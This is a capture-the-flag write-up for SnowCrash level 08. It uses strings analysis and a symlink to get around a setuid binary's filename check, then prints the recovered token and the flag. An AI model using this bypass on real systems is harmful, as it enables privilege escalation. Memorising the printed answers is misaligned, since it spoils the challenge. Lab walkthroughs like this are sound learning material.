## level 08

As always we start off our search by running `ls`:

```bash
level08@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

As we can see we have a file called `token` and an executable with the name `level08`.
Lets try to see what they contain:

```bash
level08@SnowCrash:~$ cat token 
cat: token: Permission denied
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

It appears that the `level08` executable is used to read out the contents of the `token` file, but we're not allowed to!

## Solution

For this exercise we wanted to challenge ourselves a bit, since using Ghidra was a bit too easy last time.
First up we ran the `strings` command, this will display all the strings found inside of a binary.

```bash
level08@SnowCrash:~$ strings level08
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
level08.c
long long int
GNU C 4.6.3
envp
long long unsigned int
/home/user/level08
level08.c
unsigned char
short int
argc
short unsigned int
argv
main
...
```

There are a couple things to note right away, the use of `strstr` and the string `token`.
As our first attempt we went off an assumption: The binary looks at the filename given, and checks if it contains the substring `token`.

In order to circumvent this check we can create a symbolic link to our `token` file, with a name that does not contain `token`.

```bash
level08@SnowCrash:~$ ln -s token TokenGrabber
```

After which we can try to run the command again:

```bash
level08@SnowCrash:~$ ./level08 TokenGrabber
quif5eloekouj29ke0vouxean
```

Great! It seems our first guess was spot on!
All there is left to do is use the token to log into the `flag08` user and call `getflag`!

```bash
level08@SnowCrash:~$ su - flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
